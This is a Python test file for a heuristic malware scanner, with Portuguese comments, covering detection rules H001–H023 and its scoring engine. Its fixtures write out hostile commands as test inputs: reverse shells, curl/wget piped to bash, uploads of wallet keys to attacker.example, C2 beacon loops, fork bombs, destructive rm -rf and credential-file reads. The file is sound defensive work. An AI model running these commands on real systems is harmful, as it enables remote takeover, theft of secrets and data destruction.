"""
tests/test_heuristics.py
=========================
Testes do motor heurístico (Patch 8).

Cobre:
  - HeuristicRule: criação, match retorna RuleMatch ou None
  - HeuristicContext: campos e defaults
  - RuleMatch: criação, imutabilidade
  - Cada regra individualmente (H001–H022)
  - HeuristicEngine: analyze, analyze_bytes, _calculate_score,
                     sensibilidade, regras desabilitadas,
                     HeuristicResult.primary_reason, to_dict,
                     integração com log_manager mock
"""

from __future__ import annotations

import os
import secrets
import stat
from pathlib import Path
from typing  import Generator
from unittest.mock import MagicMock, patch

import pytest

from ekprotection.config.manager        import ConfigManager
from ekprotection.heuristics.rules      import (
    ALL_RULES, RULES_BY_ID,
    HeuristicContext, HeuristicRule, RuleMatch,
    _r_high_entropy, _r_exec_in_tmp, _r_base64_decode, _r_eval_exec,
    _r_download_execute, _r_reverse_shell, _r_privesc, _r_cron_persistence,
    _r_sensitive_files, _r_rm_rf, _r_fork_bomb, _r_history_deletion,
    _r_obfuscation, _r_ptrace_ld_preload, _r_memfd_proc, _r_packed_upx,
    _r_hardcoded_ip, _r_crypto_strings, _r_c2_beacon, _r_chmod_plus_x,
    _r_hidden_executable, _r_no_extension_elf, _r_secret_exfiltration,
)
from ekprotection.heuristics.engine     import HeuristicEngine, HeuristicResult


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def cfg(tmp_path: Path) -> ConfigManager:
    os.environ["EKP_DATA_DIR"] = str(tmp_path)
    m = ConfigManager(tmp_path / "config.yaml")
    m.load()
    m.set("heuristics.enabled",           True)
    m.set("heuristics.sensitivity",       "medium")
    m.set("heuristics.entropy_threshold", 7.2)
    m.set("heuristics.disabled_rules",    [])
    yield m
    os.environ.pop("EKP_DATA_DIR", None)


@pytest.fixture
def engine(cfg: ConfigManager) -> HeuristicEngine:
    return HeuristicEngine(cfg)


def _ctx(
    path:          str             = "/tmp/test.sh",
    content:       bytes           = b"",
    is_elf:        bool            = False,
    is_script:     bool            = False,
    is_executable: bool            = False,
    entropy:       float | None    = None,
    extension:     str             = ".sh",
) -> HeuristicContext:
    return HeuristicContext(
        path           = path,
        content_sample = content,
        is_elf         = is_elf,
        is_script      = is_script,
        is_executable  = is_executable,
        entropy        = entropy,
        extension      = extension,
    )


# ---------------------------------------------------------------------------
# Testes: RuleMatch e HeuristicRule
# ---------------------------------------------------------------------------

class TestRuleMatch:
    def test_basic_creation(self) -> None:
        m = RuleMatch("H001", "detalhe do match")
        assert m.rule_id  == "H001"
        assert m.detail   == "detalhe do match"
        assert m.evidence is None

    def test_with_evidence(self) -> None:
        m = RuleMatch("H006", "reverse shell", evidence="bash -i >& /dev/tcp/1.2.3.4/4444")
        assert "tcp" in m.evidence

    def test_immutable(self) -> None:
        m = RuleMatch("H001", "test")
        with pytest.raises((AttributeError, TypeError)):
            m.rule_id = "H999"  # type: ignore[misc]


class TestAllRulesCatalog:
    def test_all_rules_have_unique_ids(self) -> None:
        ids = [r.rule_id for r in ALL_RULES]
        assert len(ids) == len(set(ids))

    def test_all_rules_have_required_fields(self) -> None:
        for rule in ALL_RULES:
            assert rule.rule_id
            assert rule.name
            assert rule.severity in ("baixo", "médio", "alto", "crítico")
            assert 1 <= rule.weight <= 10
            assert rule.tags

    def test_rules_by_id_complete(self) -> None:
        for rule in ALL_RULES:
            assert rule.rule_id in RULES_BY_ID

    def test_total_rule_count(self) -> None:
        assert len(ALL_RULES) == 23


# ---------------------------------------------------------------------------
# Testes: Regras individuais
# ---------------------------------------------------------------------------

class TestRuleH001HighEntropy:
    def test_high_entropy_elf_triggers(self) -> None:
        ctx = _ctx(entropy=7.5, is_elf=True)
        assert _r_high_entropy(ctx, "H001") is not None

    def test_high_entropy_executable_triggers(self) -> None:
        ctx = _ctx(entropy=7.3, is_executable=True)
        assert _r_high_entropy(ctx, "H001") is not None

    def test_low_entropy_no_trigger(self) -> None:
        ctx = _ctx(entropy=5.0, is_elf=True)
        assert _r_high_entropy(ctx, "H001") is None

    def test_high_entropy_non_executable_no_trigger(self) -> None:
        ctx = _ctx(entropy=7.9, is_elf=False, is_executable=False)
        assert _r_high_entropy(ctx, "H001") is None

    def test_no_entropy_no_trigger(self) -> None:
        ctx = _ctx(entropy=None, is_elf=True)
        assert _r_high_entropy(ctx, "H001") is None


class TestRuleH002ExecInTmp:
    def test_exec_in_tmp_triggers(self) -> None:
        ctx = _ctx(path="/tmp/backdoor", is_executable=True)
        assert _r_exec_in_tmp(ctx, "H002") is not None

    def test_elf_in_dev_shm_triggers(self) -> None:
        ctx = _ctx(path="/dev/shm/hidden", is_elf=True)
        assert _r_exec_in_tmp(ctx, "H002") is not None

    def test_script_in_var_tmp_triggers(self) -> None:
        ctx = _ctx(path="/var/tmp/install.sh", is_script=True)
        assert _r_exec_in_tmp(ctx, "H002") is not None

    def test_exec_in_home_no_trigger(self) -> None:
        ctx = _ctx(path="/home/user/myapp", is_executable=True)
        assert _r_exec_in_tmp(ctx, "H002") is None

    def test_non_exec_in_tmp_no_trigger(self) -> None:
        ctx = _ctx(path="/tmp/readme.txt", is_executable=False)
        assert _r_exec_in_tmp(ctx, "H002") is None

    def test_exec_in_nested_tmp_triggers(self) -> None:
        ctx = _ctx(path="/mnt/x/tmp/y.sh", is_script=True)
        assert _r_exec_in_tmp(ctx, "H002") is not None

    def test_exec_in_nested_dev_shm_triggers(self) -> None:
        ctx = _ctx(path="/mnt/x/dev/shm/y.sh", is_script=True)
        assert _r_exec_in_tmp(ctx, "H002") is not None

    def test_exec_in_nested_var_tmp_triggers(self) -> None:
        ctx = _ctx(path="/mnt/x/var/tmp/y.sh", is_script=True)
        assert _r_exec_in_tmp(ctx, "H002") is not None

    def test_exec_in_nested_run_user_triggers(self) -> None:
        ctx = _ctx(path="/mnt/x/run/user/1000/y.sh", is_script=True)
        assert _r_exec_in_tmp(ctx, "H002") is not None

    def test_exec_in_tmpfiles_dir_no_trigger(self) -> None:
        ctx = _ctx(path="/home/u/tmpfiles/x.sh", is_script=True)
        assert _r_exec_in_tmp(ctx, "H002") is None

    def test_exec_in_tmp_old_dir_no_trigger(self) -> None:
        ctx = _ctx(path="/tmp-old/x.sh", is_script=True)
        assert _r_exec_in_tmp(ctx, "H002") is None


class TestRuleH003Base64:
    def test_base64_decode_triggers(self) -> None:
        ctx = _ctx(content=b"echo $(echo dGVzdA== | base64 -d)", is_script=True)
        assert _r_base64_decode(ctx, "H003") is not None

    def test_base64_decode_in_python_triggers(self) -> None:
        ctx = _ctx(content=b"import base64\nbase64_decode(data)", extension=".py")
        assert _r_base64_decode(ctx, "H003") is not None

    def test_no_base64_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo hello world", is_script=True)
        assert _r_base64_decode(ctx, "H003") is None

    def test_base64_not_script_no_trigger(self) -> None:
        ctx = _ctx(content=b"base64 -d", is_script=False, extension=".txt")
        assert _r_base64_decode(ctx, "H003") is None


class TestRuleH004EvalExec:
    def test_eval_triggers(self) -> None:
        ctx = _ctx(content=b"eval($payload)", is_script=True)
        assert _r_eval_exec(ctx, "H004") is not None

    def test_exec_triggers(self) -> None:
        ctx = _ctx(content=b"exec(compile(code,'','exec'))", extension=".py")
        assert _r_eval_exec(ctx, "H004") is not None

    def test_no_eval_no_trigger(self) -> None:
        ctx = _ctx(content=b"print('hello')", is_script=True)
        assert _r_eval_exec(ctx, "H004") is None


class TestRuleH005DownloadExecute:
    def test_wget_pipe_sh_triggers(self) -> None:
        ctx = _ctx(content=b"wget http://evil.com/shell.sh | bash", is_script=True)
        assert _r_download_execute(ctx, "H005") is not None

    def test_curl_pipe_sh_triggers(self) -> None:
        ctx = _ctx(content=b"curl -s http://x.com/a.sh | sh", is_script=True)
        assert _r_download_execute(ctx, "H005") is not None

    def test_wget_without_pipe_no_trigger(self) -> None:
        ctx = _ctx(content=b"wget http://example.com/file.zip", is_script=True)
        assert _r_download_execute(ctx, "H005") is None


class TestRuleH006ReverseShell:
    def test_dev_tcp_triggers(self) -> None:
        ctx = _ctx(content=b"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
        assert _r_reverse_shell(ctx, "H006") is not None

    def test_nc_e_triggers(self) -> None:
        ctx = _ctx(content=b"nc -e /bin/bash attacker.com 4444")
        assert _r_reverse_shell(ctx, "H006") is not None

    def test_socat_triggers(self) -> None:
        ctx = _ctx(content=b"socat exec:'bash -li' tcp:host:port")
        assert _r_reverse_shell(ctx, "H006") is not None

    def test_clean_content_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo 'hello world'")
        assert _r_reverse_shell(ctx, "H006") is None


class TestRuleH007Privesc:
    def test_sudo_i_triggers(self) -> None:
        ctx = _ctx(content=b"sudo -i")
        assert _r_privesc(ctx, "H007") is not None

    def test_pkexec_triggers(self) -> None:
        ctx = _ctx(content=b"pkexec /bin/bash")
        assert _r_privesc(ctx, "H007") is not None

    def test_no_privesc_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo 'running as user'")
        assert _r_privesc(ctx, "H007") is None


class TestRuleH008CronPersistence:
    def test_crontab_u_triggers(self) -> None:
        ctx = _ctx(content=b"crontab -l | grep evil; crontab -u root")
        assert _r_cron_persistence(ctx, "H008") is not None

    def test_etc_cron_triggers(self) -> None:
        ctx = _ctx(content=b"echo '* * * * * /tmp/evil.sh' >> /etc/cron.d/backdoor")
        assert _r_cron_persistence(ctx, "H008") is not None

    def test_no_cron_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo hello")
        assert _r_cron_persistence(ctx, "H008") is None


class TestRuleH009SensitiveFiles:
    def test_shadow_triggers(self) -> None:
        ctx = _ctx(content=b"cat /etc/shadow | grep root")
        assert _r_sensitive_files(ctx, "H009") is not None

    def test_passwd_triggers(self) -> None:
        ctx = _ctx(content=b"cp /etc/passwd /tmp/p")
        assert _r_sensitive_files(ctx, "H009") is not None

    def test_clean_content_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo 'listing files'")
        assert _r_sensitive_files(ctx, "H009") is None

    # Achado 2026-09-17: acesso local (sem upload de rede) a credencial/wallet
    # não disparava H009 nem nenhuma outra regra — só H023, que exige o combo
    # com curl/wget. Estes casos cobrem o acesso isolado.
    def test_wallet_dat_local_copy_triggers(self) -> None:
        ctx = _ctx(content=b"cp ~/.bitcoin/wallet.dat /tmp/staged/w.bak")
        assert _r_sensitive_files(ctx, "H009") is not None

    def test_id_rsa_local_read_triggers(self) -> None:
        ctx = _ctx(content=b"cat ~/.ssh/id_rsa >> /tmp/collected")
        assert _r_sensitive_files(ctx, "H009") is not None

    def test_keystore_local_read_triggers(self) -> None:
        ctx = _ctx(content=b"tar czf /tmp/loot.tgz ~/.ethereum/keystore")
        assert _r_sensitive_files(ctx, "H009") is not None

    def test_mnemonic_local_read_triggers(self) -> None:
        ctx = _ctx(content=b"grep -r 'mnemonic' /home/*/wallet-backup/")
        assert _r_sensitive_files(ctx, "H009") is not None

    def test_ekp_own_secrets_local_read_triggers(self) -> None:
        ctx = _ctx(content=b"cp /var/lib/ek-protection/quarantine.key /tmp/x")
        assert _r_sensitive_files(ctx, "H009") is not None

    def test_unrelated_word_no_trigger(self) -> None:
        ctx = _ctx(content=b"key lime pie recipe, private beach access")
        assert _r_sensitive_files(ctx, "H009") is None


class TestRuleH010RmRf:
    def test_rm_rf_root_triggers(self) -> None:
        ctx = _ctx(content=b"rm -rf /etc /var /usr")
        assert _r_rm_rf(ctx, "H010") is not None

    def test_rm_rf_tmp_subdir_does_not_trigger(self) -> None:
        """Antes (até 2026-09-20) este caso era afirmado como disparo
        crítico — falso-positivo: `rm -rf /tmp/...` é limpeza normal de
        build/cache e disparava auto-quarentena."""
        ctx = _ctx(content=b"rm -rf /tmp/safe")
        assert _r_rm_rf(ctx, "H010") is None

    def test_no_rm_no_trigger(self) -> None:
        ctx = _ctx(content=b"ls -la /tmp")
        assert _r_rm_rf(ctx, "H010") is None

    @pytest.mark.parametrize("cmd", [
        b"rm -rf /", b"rm -rf /*", b"rm -fr /home", b"rm -rf //", b"rm -rf /etc/",
        b"rm -rf --no-preserve-root /", b"rm --no-preserve-root -rf /",
        b"rm -rfv /etc", b"rm -r -f /usr", b"rm --recursive --force /var/lib",
        b"rm /etc -rf", b"rm -Rf /usr/local", b"rm -rf '/etc'",
        b"sudo rm -rf /boot", b"/bin/rm -rf /", b"cd /tmp && rm -rf /etc",
        b"xargs rm -rf /var/log",
        b"rm -rf ~", b"rm -rf ~/", b"rm -rf $HOME", b'rm -rf "$HOME"',
        b"rm -rf ${HOME}/*", b"rm -rf /home/alice", b"rm -rf /root",
        b"rm -rf ~/.ssh", b"rm -rf ~/.bitcoin",
    ])
    def test_destructive_forms_trigger(self, cmd: bytes) -> None:
        assert _r_rm_rf(_ctx(content=cmd), "H010") is not None

    @pytest.mark.parametrize("cmd", [
        b"rm -rf /tmp/build", b"rm -rf /tmp/*", b"rm -f /tmp/app.pid",
        b"rm -f /var/run/app.lock", b"rm -rf /var/cache/apt/archives/partial",
        b"rm -rf /home/alice/proj/node_modules", b"rm -rf ~/proj/build",
        b"rm -rf $HOME/.cache/pip", b"rm -rf /opt/myapp/releases/old",
        b"rm -rf /var/www/html/cache", b"rm -rf ./build", b"rm foo.txt",
        b"rm -i /tmp/x",
    ])
    def test_routine_cleanup_does_not_trigger(self, cmd: bytes) -> None:
        assert _r_rm_rf(_ctx(content=cmd), "H010") is None

    @pytest.mark.parametrize("cmd", [
        b"confirm -f /etc/hosts", b"perform -r /data", b"form -f /x",
        b"echo skirm -r /var",
    ])
    def test_word_ending_in_rm_does_not_trigger(self, cmd: bytes) -> None:
        """Sem word-boundary, `confirm -f /...` casava como `rm -f /...`."""
        assert _r_rm_rf(_ctx(content=cmd), "H010") is None

    def test_detail_names_the_target(self) -> None:
        m = _r_rm_rf(_ctx(content=b"rm -rf ~/.bitcoin"), "H010")
        assert m is not None and "~/.bitcoin" in m.detail


class TestRuleH011ForkBomb:
    def test_classic_fork_bomb_triggers(self) -> None:
        ctx = _ctx(content=b":(){ :|:& };:")
        assert _r_fork_bomb(ctx, "H011") is not None

    def test_forkbomb_keyword_triggers(self) -> None:
        ctx = _ctx(content=b"# this is a forkbomb test")
        assert _r_fork_bomb(ctx, "H011") is not None

    def test_no_fork_bomb_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo hello; sleep 1")
        assert _r_fork_bomb(ctx, "H011") is None


class TestRuleH012HistoryDeletion:
    def test_history_c_triggers(self) -> None:
        ctx = _ctx(content=b"history -c; history -w")
        assert _r_history_deletion(ctx, "H012") is not None

    def test_histfile_devnull_triggers(self) -> None:
        ctx = _ctx(content=b"export HISTFILE=/dev/null")
        assert _r_history_deletion(ctx, "H012") is not None

    def test_no_history_cmd_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo $HISTSIZE")
        assert _r_history_deletion(ctx, "H012") is None


class TestRuleH013Obfuscation:
    def test_long_hex_escapes_triggers(self) -> None:
        hex_str = b"\\x41\\x42\\x43\\x44\\x45\\x46\\x47"
        ctx = _ctx(content=hex_str, is_script=True)
        assert _r_obfuscation(ctx, "H013") is not None

    def test_clean_script_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo 'clean script'", is_script=True)
        assert _r_obfuscation(ctx, "H013") is None

    def test_non_script_no_trigger(self) -> None:
        ctx = _ctx(content=b"\\x41\\x42" * 10, is_script=False, extension=".bin")
        assert _r_obfuscation(ctx, "H013") is None


class TestRuleH014PtracePreload:
    def test_ptrace_triggers(self) -> None:
        ctx = _ctx(content=b"int r = ptrace(PTRACE_ATTACH, pid)", is_elf=True)
        assert _r_ptrace_ld_preload(ctx, "H014") is not None

    def test_ld_preload_in_elf_triggers(self) -> None:
        ctx = _ctx(content=b"LD_PRELOAD=/tmp/evil.so", is_elf=True)
        assert _r_ptrace_ld_preload(ctx, "H014") is not None

    def test_ptrace_string_without_elf_no_trigger(self) -> None:
        """ptrace() é syscall nativa — string crua sem ser binário ELF
        não é evidência de nada (ex.: texto/doc mencionando a palavra)."""
        ctx = _ctx(content=b"ptrace stuff", is_elf=False)
        assert _r_ptrace_ld_preload(ctx, "H014") is None

    def test_ld_preload_export_in_shell_script_triggers(self) -> None:
        """Achado real (2026-09-18): dropper em shell setando LD_PRELOAD
        pra sequestrar libs de um processo alvo (wallet CLI, bot) nunca
        precisa ser um binário ELF — a regra exigia is_elf=True pra
        QUALQUER sinal, inclusive esse, e passava batido."""
        ctx = _ctx(
            content=b"#!/bin/bash\nexport LD_PRELOAD=/tmp/.hook.so\n./wallet-cli\n",
            is_script=True, is_elf=False, extension=".sh",
        )
        assert _r_ptrace_ld_preload(ctx, "H014") is not None

    def test_ld_so_preload_file_write_in_script_triggers(self) -> None:
        """Variante persistente: escrever direto em /etc/ld.so.preload
        sequestra TODO processo do sistema, sem precisar relançar nada."""
        ctx = _ctx(
            content=b"#!/bin/bash\necho /tmp/.hook.so >> /etc/ld.so.preload\n",
            is_script=True, is_elf=False, extension=".sh",
        )
        assert _r_ptrace_ld_preload(ctx, "H014") is not None

    def test_ld_preload_in_plain_non_script_no_trigger(self) -> None:
        """Sem ser ELF nem script (ex.: log/texto solto citando a env var),
        não deve disparar — evita falso-positivo em documentação/log."""
        ctx = _ctx(
            content=b"saw LD_PRELOAD=/tmp/x.so in a log line",
            is_script=False, is_elf=False, extension=".txt",
        )
        assert _r_ptrace_ld_preload(ctx, "H014") is None

    def test_ptrace_syscall_string_in_script_does_not_trigger_ptrace_signal(self) -> None:
        """ptrace() continua exigindo ELF (não é técnica de shell) — um
        script mencionando a palavra sem LD_PRELOAD não deve disparar."""
        ctx = _ctx(
            content=b"#!/bin/bash\necho 'debugging via ptrace(2) syscall'\n",
            is_script=True, is_elf=False, extension=".sh",
        )
        assert _r_ptrace_ld_preload(ctx, "H014") is None


class TestRuleH015Fileless:
    def test_memfd_create_triggers(self) -> None:
        ctx = _ctx(content=b"fd = memfd_create('tmp', 0)")
        assert _r_memfd_proc(ctx, "H015") is not None

    def test_proc_self_mem_triggers(self) -> None:
        ctx = _ctx(content=b"open('/proc/self/mem', 'wb')")
        assert _r_memfd_proc(ctx, "H015") is not None

    def test_no_fileless_no_trigger(self) -> None:
        ctx = _ctx(content=b"open('/tmp/normal', 'rb')")
        assert _r_memfd_proc(ctx, "H015") is None

    @pytest.mark.parametrize("content", [
        b"dd if=/proc/$PID/mem bs=1 skip=$ADDR count=64",
        b"cat /proc/${wallet_pid}/mem",
        b"cat /proc/$$/mem",
        b"dd if=/proc/$(pgrep wallet-cli)/mem of=/dev/null",
        b"open(f'/proc/{pid}/mem', 'rb')",
        b"open('/proc/%d/mem' % pid, 'rb')",
        b"open('/proc/' + str(pid) + '/mem', 'rb')",
        b"open('/proc/thread-self/mem', 'r+b')",
    ])
    def test_proc_pid_mem_variable_forms_trigger(self, content: bytes) -> None:
        # Achado 2026-09-19: só PID literal ([0-9]+) e "self" disparavam;
        # scraper real de memória de wallet/bot escreve o PID como variável.
        assert _r_memfd_proc(_ctx(content=content), "H015") is not None

    @pytest.mark.parametrize("content", [
        b"cat /proc/meminfo",
        b"cat /proc/1234/memory_stats",
        b"cat /proc/$PID/status",
        b"open('/proc/' + name + '/cmdline')",
    ])
    def test_proc_lookalikes_no_trigger(self, content: bytes) -> None:
        # "mem" como prefixo de outra palavra (memory_stats) não é a técnica.
        assert _r_memfd_proc(_ctx(content=content), "H015") is None


class TestRuleH016PackedUPX:
    def test_upx_magic_triggers(self) -> None:
        ctx = _ctx(content=b"\x7fELF\x00\x00UPX!\x00", is_elf=True)
        assert _r_packed_upx(ctx, "H016") is not None

    def test_not_upx_no_trigger(self) -> None:
        ctx = _ctx(content=b"\x7fELF\x00\x00\x00\x00", is_elf=True)
        assert _r_packed_upx(ctx, "H016") is None

    def test_not_elf_no_trigger(self) -> None:
        ctx = _ctx(content=b"UPX!", is_elf=False)
        assert _r_packed_upx(ctx, "H016") is None


class TestRuleH017HardcodedIP:
    def test_external_ips_trigger(self) -> None:
        ctx = _ctx(
            content=b"connect to 185.220.101.1 and 45.33.32.156 for updates",
            is_elf=True,
        )
        assert _r_hardcoded_ip(ctx, "H017") is not None

    def test_local_ips_no_trigger(self) -> None:
        ctx = _ctx(content=b"host 127.0.0.1 and 192.168.1.1", is_elf=True)
        assert _r_hardcoded_ip(ctx, "H017") is None

    def test_single_ip_no_trigger(self) -> None:
        ctx = _ctx(content=b"server = 8.8.8.8", is_elf=True)
        assert _r_hardcoded_ip(ctx, "H017") is None

    def test_not_elf_no_trigger(self) -> None:
        ctx = _ctx(content=b"1.2.3.4 and 5.6.7.8", is_elf=False)
        assert _r_hardcoded_ip(ctx, "H017") is None


class TestRuleH018CryptoStrings:
    def test_bitcoin_address_triggers(self) -> None:
        ctx = _ctx(content=b"send to 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divfna")
        # valid-looking BTC address pattern
        ctx2 = _ctx(content=b"wallet=1A1zP1eP5QGefi2DMPTfTL5SLmv7Divfna")
        r = _r_crypto_strings(ctx2, "H018")
        # May or may not match depending on exact regex — just verify no crash
        assert r is None or isinstance(r, RuleMatch)

    def test_no_crypto_no_trigger(self) -> None:
        ctx = _ctx(content=b"hello world normal content")
        assert _r_crypto_strings(ctx, "H018") is None


class TestRuleH019C2Beacon:
    def test_sleep_then_curl_triggers(self) -> None:
        ctx = _ctx(content=b"while true; do sleep 60; curl http://c2.evil.com/cmd; done")
        assert _r_c2_beacon(ctx, "H019") is not None

    def test_curl_then_sleep_triggers(self) -> None:
        # ordem inversa: faz a requisição primeiro, depois dorme — padrão
        # real de beacon tão comum quanto "sleep antes", não era detectado
        # antes da correção (regex exigia só uma ordem específica).
        ctx = _ctx(
            content=b"while true; do curl -s http://c2.evil.com/cmd -o /tmp/c; "
                    b"sh /tmp/c; sleep 60; done"
        )
        assert _r_c2_beacon(ctx, "H019") is not None

    def test_wget_then_sleep_triggers(self) -> None:
        ctx = _ctx(content=b"wget -q http://c2.evil.com/beacon; sleep 120")
        assert _r_c2_beacon(ctx, "H019") is not None

    def test_no_pattern_no_trigger(self) -> None:
        ctx = _ctx(content=b"sleep 5  # just a wait")
        assert _r_c2_beacon(ctx, "H019") is None

    def test_sleep_near_word_containing_nc_does_not_trigger(self) -> None:
        # falso-positivo real da versão anterior: "nc" batia como
        # substring de "function"/"sync"/"balance"/"announce" mesmo sem
        # nenhum uso de rede de verdade, gerando quarentena automática
        # crítica indevida.
        ctx = _ctx(content=b"sleep 30\nfunction cleanup() { echo done; }\ncleanup")
        assert _r_c2_beacon(ctx, "H019") is None

    def test_sleep_near_sync_word_does_not_trigger(self) -> None:
        ctx = _ctx(content=b"sleep 10; rsync -av /data/ /backup/; balance_check")
        assert _r_c2_beacon(ctx, "H019") is None


class TestRuleH020ChmodDownload:
    def test_download_chmod_x_triggers(self) -> None:
        ctx = _ctx(
            content=b"wget http://x.com/payload; chmod +x payload; ./payload",
            is_script=True,
        )
        assert _r_chmod_plus_x(ctx, "H020") is not None

    def test_chmod_without_download_no_trigger(self) -> None:
        ctx = _ctx(content=b"chmod +x myscript.sh", is_script=True)
        assert _r_chmod_plus_x(ctx, "H020") is None


class TestRuleH021HiddenExec:
    def test_hidden_executable_triggers(self) -> None:
        ctx = _ctx(path="/home/user/.hidden_backdoor", is_executable=True)
        assert _r_hidden_executable(ctx, "H021") is not None

    def test_visible_executable_no_trigger(self) -> None:
        ctx = _ctx(path="/home/user/myapp", is_executable=True)
        assert _r_hidden_executable(ctx, "H021") is None

    def test_hidden_non_exec_no_trigger(self) -> None:
        ctx = _ctx(path="/home/user/.bashrc", is_executable=False)
        assert _r_hidden_executable(ctx, "H021") is None


class TestRuleH022ElfNoExtension:
    def test_elf_in_home_triggers(self) -> None:
        ctx = _ctx(path="/home/user/backdoor", is_elf=True, extension="")
        assert _r_no_extension_elf(ctx, "H022") is not None

    def test_elf_in_usr_bin_no_trigger(self) -> None:
        ctx = _ctx(path="/usr/bin/python", is_elf=True, extension="")
        assert _r_no_extension_elf(ctx, "H022") is None

    def test_elf_with_extension_no_trigger(self) -> None:
        ctx = _ctx(path="/home/user/app.bin", is_elf=True, extension=".bin")
        assert _r_no_extension_elf(ctx, "H022") is None

    def test_non_elf_no_trigger(self) -> None:
        ctx = _ctx(path="/home/user/noext", is_elf=False, extension="")
        assert _r_no_extension_elf(ctx, "H022") is None


class TestRuleH023SecretExfiltration:
    """Achado real da rodada de 2026-09-15: nenhuma regra existente cobria
    o padrão "ler segredo próprio do EK-Protection ou de wallet + mandar
    pra rede" — H009 só olha /etc/shadow&cia (credenciais do SO, não da
    wallet/app), H019 exige loop de beacon (sleep+curl), não upload
    único."""

    def test_quarantine_key_plus_curl_upload_triggers(self) -> None:
        ctx = _ctx(
            content=b"curl -F 'f=@/home/user/.config/ekprotection/quarantine.key' "
                     b"http://attacker.example/exfil"
        )
        assert _r_secret_exfiltration(ctx, "H023") is not None

    def test_wallet_keystore_plus_data_upload_triggers(self) -> None:
        ctx = _ctx(
            content=b"cat /root/.ethereum/keystore/UTC--2020 | "
                     b"curl -d @- http://attacker.example/exfil"
        )
        assert _r_secret_exfiltration(ctx, "H023") is not None

    def test_secret_path_without_network_no_trigger(self) -> None:
        ctx = _ctx(content=b"cp wallet.dat /home/user/backup/wallet.dat")
        assert _r_secret_exfiltration(ctx, "H023") is None

    def test_curl_upload_without_secret_path_no_trigger(self) -> None:
        ctx = _ctx(content=b"curl -F 'f=@/tmp/report.txt' http://internal/upload")
        assert _r_secret_exfiltration(ctx, "H023") is None

    def test_plain_download_no_trigger(self) -> None:
        ctx = _ctx(content=b"curl http://example.com/wallet.dat -o wallet.dat")
        assert _r_secret_exfiltration(ctx, "H023") is None


# ---------------------------------------------------------------------------
# Testes: HeuristicEngine
# ---------------------------------------------------------------------------

class TestHeuristicEngine:
    def test_disabled_engine_returns_empty(self, cfg: ConfigManager) -> None:
        cfg.set("heuristics.enabled", False)
        eng = HeuristicEngine(cfg)
        r   = eng.analyze("/tmp/any_file")
        assert r.score      == 0.0
        assert r.risk_level is None
        assert r.matches    == ()

    def test_analyze_clean_file(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / "clean.txt"
        f.write_text("This is a completely safe text file.\n" * 20)
        r = engine.analyze(f)
        # Arquivo de texto sem executável não deve disparar nada
        assert r.score < 20
        assert r.risk_level is None

    def test_analyze_reverse_shell_script(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / "reverse.sh"
        f.write_bytes(b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
        f.chmod(0o755)
        r = engine.analyze(f)
        assert r.is_suspicious
        assert "H006" in r.rules_fired

    def test_analyze_downloader_script(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / "dropper.sh"
        f.write_bytes(b"#!/bin/bash\nwget http://evil.com/payload.sh | bash\n")
        r = engine.analyze(f)
        assert r.is_suspicious
        assert "H005" in r.rules_fired

    def test_analyze_fork_bomb(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / "bomb.sh"
        f.write_bytes(b"#!/bin/sh\n:(){ :|:& };:\n")
        r = engine.analyze(f)
        assert r.is_suspicious
        assert "H011" in r.rules_fired

    def test_analyze_hidden_executable(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / ".backdoor"
        f.write_bytes(b"#!/bin/bash\necho owned\n")
        f.chmod(0o755)
        r = engine.analyze(f)
        assert "H021" in r.rules_fired

    def test_multiple_rules_higher_score(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        """Arquivo com múltiplos indicadores deve ter score maior."""
        single = tmp_path / "single.sh"
        single.write_bytes(b"#!/bin/sh\nrm -rf /\n")

        multi = tmp_path / "multi.sh"
        multi.write_bytes(
            b"#!/bin/sh\n"
            b"wget http://evil.com/payload | bash\n"
            b"rm -rf /etc\n"
            b":(){ :|:& };:\n"
            b"history -c\n"
        )
        r_single = engine.analyze(single)
        r_multi  = engine.analyze(multi)
        assert r_multi.score >= r_single.score

    def test_analyze_bytes(self, engine: HeuristicEngine) -> None:
        content = b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
        r = engine.analyze_bytes("/tmp/test.sh", content)
        assert r.is_suspicious
        assert "H006" in r.rules_fired

    def test_disabled_rule_not_fired(self, cfg: ConfigManager, tmp_path: Path) -> None:
        cfg.set("heuristics.disabled_rules", ["H011"])
        eng = HeuristicEngine(cfg)
        f   = tmp_path / "bomb.sh"
        f.write_bytes(b":(){ :|:& };:")
        r = eng.analyze(f)
        assert "H011" not in r.rules_fired

    def test_sensitivity_paranoid_lower_threshold(self, cfg: ConfigManager, tmp_path: Path) -> None:
        """Sensibilidade paranoid → score aparece maior → risco detectado mais cedo."""
        cfg.set("heuristics.sensitivity", "paranoid")
        eng_paranoid = HeuristicEngine(cfg)
        cfg.set("heuristics.sensitivity", "low")
        eng_low = HeuristicEngine(cfg)

        f = tmp_path / "mild.sh"
        f.write_bytes(b"#!/bin/sh\nhistory -c\n")   # só 1 regra fraca

        r_paranoid = eng_paranoid.analyze(f)
        r_low      = eng_low.analyze(f)
        assert r_paranoid.score >= r_low.score

    def test_primary_reason_is_highest_weight(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        """primary_reason deve ser da regra de maior peso."""
        f = tmp_path / "multi.sh"
        f.write_bytes(
            b"#!/bin/bash\n"
            b"history -c\n"                                    # H012 weight=5
            b"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"       # H006 weight=10
        )
        r = engine.analyze(f)
        assert r.primary_reason is not None
        # H006 tem peso 10, deve prevalecer
        if "H006" in r.rules_fired and r.primary_reason:
            reason_lower = r.primary_reason.lower()
